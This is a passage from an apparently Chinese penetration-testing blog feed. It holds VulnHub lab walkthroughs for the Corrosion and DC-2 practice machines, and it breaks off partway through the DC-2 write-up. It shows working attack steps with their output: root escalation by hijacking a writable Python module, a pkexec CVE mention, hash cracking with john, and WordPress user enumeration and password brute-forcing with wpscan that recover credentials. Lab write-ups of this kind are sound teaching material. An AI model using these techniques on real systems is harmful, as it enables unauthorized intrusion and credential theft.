2&gt;/dev/null<br>/snap/core18/2128/usr/lib/python3.6/base64.py<br>/snap/core18/2409/usr/lib/python3.6/base64.py<br>/snap/core20/1518/usr/lib/python3.8/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python3.6/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py<br>/usr/lib/python3.8/base64.py<br>randy@corrosion:~$ ls -l /usr/lib/python3.8/base64.py<br>-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py<br></code></pre></td></tr></table></figure><p>ç›´æ¥åœ¨ base64 æ¨¡å—é‡Œé¢å†™å…¥è°ƒç”¨ shell çš„è¯­å¥ï¼Œä½¿ç”¨ os æ¨¡å—è°ƒç”¨ shell ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ vi /usr/lib/python3.8/base64.py<br><span class="hljs-meta">#</span><span class="bash"> import os</span><br><span class="hljs-meta">#</span><span class="bash"> os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ randombase64.py æ–‡ä»¶ï¼ŒæˆåŠŸå¾—åˆ° root æƒé™ï¼ŒæŸ¥çœ‹ flagï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py<br>[sudo] password for randy: <br>root@corrosion:/home/randy# whoami<br>root<br>root@corrosion:/home/randy# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@corrosion:/home/randy# ls /root<br>root.txt  snap<br>root@corrosion:/home/randy# cat /root/root.txt<br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure><h3 id="M2ã€SUID"><a href="#M2ã€SUID" class="headerlink" title="M2ã€SUID"></a>M2ã€SUID</h3><p>æ‰¾åˆ° <code>/usr/bin/pkexec</code> ï¼Œå¯ä»¥ä½¿ç”¨ <code>CVE-2021-4034</code> é€šæ€æ¼æ´è¿›è¡Œææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>[.......]<br>/usr/bin/pkexec<br>/usr/sbin/pppd<br>[.......]<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€ç›®å½•æ‰«æï¼šdirsearchã€niktoã€dirbï¼ˆåŠ å‚æ•° -X ï¼šæ‰«æç‰¹å®šåç¼€çš„æ–‡ä»¶ï¼‰</p><p>2ã€å¤‡ä»½æ–‡ä»¶ï¼šé…ç½®æ–‡ä»¶æ³„éœ²</p><p>3ã€zipæ–‡ä»¶ç ´è§£ï¼šzip2john + johnï¼Œfcrackzip</p><p>4ã€tomcatï¼šmsfã€upload war</p><p>5ã€æ’åº“ï¼šSSH</p><p>6ã€lookï¼šè¶Šæƒè®¿é—®</p><p>7ã€çˆ†ç ´ï¼šhash john/hashcatã€ssh hydra</p><p>8ã€ææƒï¼šsudoã€CVE-2021-4034</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>unshadow å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unshadow passwd shadow &gt; password.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt password.txt</span><br></code></pre></td></tr></table></figure><p> å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ç”Ÿæˆéœ€è¦ç ´è§£çš„æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> shadow</span> <br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:18878:0:99999:7:::<br><span class="hljs-meta">#</span><span class="bash"> passwd</span> <br>kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br><span class="hljs-meta">#</span><span class="bash"> password.txt</span><br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š2</title>
    <link href="/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/"/>
    <url>/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x05-DC-2-vulnhub"><a href="#0x05-DC-2-vulnhub" class="headerlink" title="0x05 DC: 2~vulnhub"></a>0x05 DC: 2~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.148</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.011s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00018s latency).<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0020s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.62 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.148</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0010s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 00:0C:29:3D:C0:33 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds<br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:27 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Did not follow redirect to http://dc-2/<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br>|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br>|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br>|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>7744/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>7744ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>è®¿é—® <code>http://192.168.135.148</code> ï¼Œå‘ç°æ— æ³•è®¿é—®ä¸”é‡å®šå‘åˆ°äº† <code>http://dc-2/</code> ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬æ·»åŠ ä¸€æ¡æ˜ å°„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>                                                                                             <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/hosts</span>   <br><span class="hljs-meta">#</span><span class="bash"> æ·»åŠ : 192.168.135.148 dc-2</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.148 dc-2<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚</p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://dc-2</span>                                                    <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sun Jun 26 21:05:39 2022<br>URL_BASE: http://dc-2/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://dc-2/ ----<br>+ http://dc-2/index.php (CODE:301|SIZE:0)<br>+ http://dc-2/server-status (CODE:403|SIZE:292)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/<br>==&gt; DIRECTORY: http://dc-2/wp-content/<br>==&gt; DIRECTORY: http://dc-2/wp-includes/<br>+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)<br><br>---- Entering directory: http://dc-2/wp-admin/ ----<br>+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/css/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/images/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/includes/<br>+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/js/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/maint/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/network/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/user/<br><br>---- Entering directory: http://dc-2/wp-content/ ----<br>+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-content/languages/<br>==&gt; DIRECTORY: http://dc-2/wp-content/plugins/<br>==&gt; DIRECTORY: http://dc-2/wp-content/themes/<br><br>---- Entering directory: http://dc-2/wp-admin/network/ ----<br>+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-admin/user/ ----<br>+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/plugins/ ----<br>+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/themes/ ----<br>+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0)<br><br>-----------------<br>END_TIME: Sun Jun 26 21:06:32 2022<br>DOWNLOADED: 32284 - FOUND: 12<br></code></pre></td></tr></table></figure><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>è®¿é—® <code>http://dc-2</code> ï¼Œå¾—åˆ°ä¸€äº›æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> http://dc-2</span><br>DC-2<br>Just another WordPress site<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> http://dc-2/index.php/flag/</span><br>Flag 1:<br>Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.<br>More passwords is always better, but sometimes you just canâ€™t win them all.<br>Log in as one to see the next flag.<br>If you canâ€™t find it, log in as another.<br></code></pre></td></tr></table></figure><p>æ‰«æ WordPress ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 --enumerate u</span>  <br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Started: Sun Jun 26 21:26:57 2022<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme in use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2022-05-24T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of date, the latest version is 3.0<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:01 &lt;=========================================================================&gt; (10 / 10) 100.00% Time: 00:00:01<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jerry<br> | Found By: Wp Json Api (Aggressive Detection)<br> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> | Confirmed By:<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] tom<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ cewl å¯¹ç«™ç‚¹ç”Ÿæˆå­—å…¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://dc-2 -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njerry\ntom&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>admin<br>jerry<br>tom<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ wpscan è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 -U user.txt -P passwd.txt</span><br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Performing password attack on Xmlrpc against 3 user/s<br>[SUCCESS] - jerry / adipiscing<br>[SUCCESS] - tom / parturient<br>Trying admin / log Time: 00:01:59 &lt;=============&gt; (646 / 1121) 57.62%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient<br></code></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥æ‰¾å¾—åˆ°ç™»å½•é¡µé¢ï¼š<code>http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php</code> ã€‚</p><p>ä½¿ç”¨ <code>Username: jerry, Password: adipiscing</code> ç™»å½•ï¼Œåœ¨ <code>Pages</code> ä¸­å‘ç° <code>flag2</code> ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">Flag <span class="hljs-number">2</span>:<br><span class="hljs-keyword">If</span> you can<span class="hljs-symbol">&#x27;t</span> exploit WordPress <span class="hljs-keyword">and</span> take a shortcut, there <span class="hljs-keyword">is</span> another way.<br>Hope you found another <span class="hljs-keyword">entry</span> point.<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¾—åˆ°çš„ç”¨æˆ·å’Œå¯†ç  <code>Username: tom, Password: parturient</code> å°è¯• SSH ç™»å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tom@192.168.135.148 -p 7744</span><br>tom@192.168.135.148&#x27;s password: <br>......<br>Last login: Sun Jun 26 19:25:52 2022 from 192.168.135.141<br>tom@DC-2:~$ ls<br>flag3.txt  usr<br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ ls usr/bin<br>less ls scp vi<br>tom@DC-2:~$ vi flag3.txt<br><span class="hljs-meta">#</span><span class="bash"> Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag3ï¼Œæ ¹æ®æç¤ºè¿›è¡Œè¿›ä¸€æ­¥ææƒã€‚</p><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><h3 id="1ã€ç»•-rbash"><a href="#1ã€ç»•-rbash" class="headerlink" title="1ã€ç»• rbash"></a>1ã€ç»• rbash</h3><blockquote><p><a href="https://xz.aliyun.com/t/7642#toc-0">rbashé€ƒé€¸å¤§å…¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></blockquote><p>å‘ç° tom ä½¿ç”¨ rbashï¼Œshell è¢«é™åˆ¶äº†ï¼ŒåŠŸèƒ½ç‰¹åˆ«å°‘ï¼Œå¾ˆå¤šå‘½ä»¤æ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥è¦ç»•è¿‡ rbash ã€‚</p><blockquote><p>restricted shell æ˜¯ä¸€ç§åªèƒ½ä½¿ç”¨éƒ¨åˆ†å‘½ä»¤çš„ shell ï¼›å®ƒä¸º Linux ä¸­çš„ shell æä¾›äº†ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚</p><p>rbashï¼ˆThe restricted mode of bashï¼‰ä¸ºé™åˆ¶å‹ bashï¼›æ˜¯ restricted shell 